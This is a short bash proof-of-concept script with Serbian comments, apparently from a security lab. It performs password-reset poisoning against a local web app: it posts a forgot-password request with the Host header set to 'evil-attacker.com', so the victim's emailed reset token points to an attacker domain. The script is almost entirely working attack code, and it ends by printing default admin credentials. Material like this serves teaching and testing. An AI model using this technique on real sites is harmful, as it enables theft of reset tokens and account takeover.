#!/usr/bin/env bash
# =============================================================
# EXPLOIT 1 – Password Reset Poisoning
# Napadač menja Host header da bi poisoning-ovao reset link.
# =============================================================

TARGET="http://localhost:3000"
VICTIM_EMAIL="marko@example.com"
ATTACKER_HOST="evil-attacker.com"

echo "=============================================="
echo " EXPLOIT 1: Password Reset Poisoning"
echo "=============================================="
echo ""
echo "[*] Cilj: $TARGET"
echo "[*] Žrtva: $VICTIM_EMAIL"
echo "[*] Napadačev domen: $ATTACKER_HOST"
echo ""

echo "[1] Normalni zahtev (bez napada):"
curl -s -X POST "$TARGET/forgot-password" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=$VICTIM_EMAIL" \
  -w "\n  HTTP status: %{http_code}\n"
echo ""

echo "[2] NAPAD – menjamo Host header na napadačev domen:"
echo ""
RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
  -X POST "$TARGET/forgot-password" \
  -H "Host: $ATTACKER_HOST" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=$VICTIM_EMAIL")

echo "[*] HTTP status: $RESPONSE"
echo "[!] Generisani reset link sadrži: http://$ATTACKER_HOST/reset-password/<TOKEN>"
echo "[!] Žrtva dobija email sa napadačevim domenom."
echo ""
echo "[3] Proverite admin panel: $TARGET/admin"
echo "    Login: admin@bank.local / admin123"